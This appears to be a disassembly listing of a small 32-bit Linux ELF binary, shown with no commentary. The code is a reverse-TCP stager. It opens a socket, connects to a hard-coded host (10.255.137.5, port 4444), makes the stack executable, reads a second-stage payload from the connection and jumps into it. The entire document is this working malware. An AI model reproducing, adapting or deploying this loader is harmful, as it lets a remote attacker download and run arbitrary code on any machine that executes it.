00000000  7F45              jg 0x47
00000002  4C                dec esp
00000003  46                inc esi
00000004  0101              add [ecx],eax
00000006  0100              add [eax],eax
00000008  0000              add [eax],al
0000000A  0000              add [eax],al
0000000C  0000              add [eax],al
0000000E  0000              add [eax],al
00000010  0200              add al,[eax]
00000012  0300              add eax,[eax]
00000014  0100              add [eax],eax
00000016  0000              add [eax],al
00000018  54                push esp
00000019  80040834          add byte [eax+ecx],0x34
0000001D  0000              add [eax],al
0000001F  0000              add [eax],al
00000021  0000              add [eax],al
00000023  0000              add [eax],al
00000025  0000              add [eax],al
00000027  003400            add [eax+eax],dh
0000002A  2000              and [eax],al
0000002C  0100              add [eax],eax
0000002E  0000              add [eax],al
00000030  0000              add [eax],al
00000032  0000              add [eax],al
00000034  0100              add [eax],eax
00000036  0000              add [eax],al
00000038  0000              add [eax],al
0000003A  0000              add [eax],al
0000003C  008004080080      add [eax-0x7ffff7fc],al
00000042  0408              add al,0x8
00000044  9B0000            wait add [eax],al
00000047  00E2              add dl,ah
00000049  0000              add [eax],al
0000004B  0007              add [edi],al
0000004D  0000              add [eax],al
0000004F  0000              add [eax],al
00000051  1000              adc [eax],al
00000053  0031              add [ecx],dh
00000055  DBF7              fcomi st7
00000057  E353              jecxz 0xac
00000059  43                inc ebx
0000005A  53                push ebx
0000005B  6A02              push byte +0x2
0000005D  B066              mov al,0x66
0000005F  89E1              mov ecx,esp
00000061  CD80              int 0x80
00000063  97                xchg eax,edi
00000064  5B                pop ebx
00000065  680AFF8905        push dword 0x589ff0a
0000006A  680200115C        push dword 0x5c110002
0000006F  89E1              mov ecx,esp
00000071  6A66              push byte +0x66
00000073  58                pop eax
00000074  50                push eax
00000075  51                push ecx
00000076  57                push edi
00000077  89E1              mov ecx,esp
00000079  43                inc ebx
0000007A  CD80              int 0x80
0000007C  B207              mov dl,0x7
0000007E  B900100000        mov ecx,0x1000
00000083  89E3              mov ebx,esp
00000085  C1EB0C            shr ebx,0xc
00000088  C1E30C            shl ebx,0xc
0000008B  B07D              mov al,0x7d
0000008D  CD80              int 0x80
0000008F  5B                pop ebx
00000090  89E1              mov ecx,esp
00000092  99                cdq
00000093  B60C              mov dh,0xc
00000095  B003              mov al,0x3
00000097  CD80              int 0x80
00000099  FFE1              jmp ecx
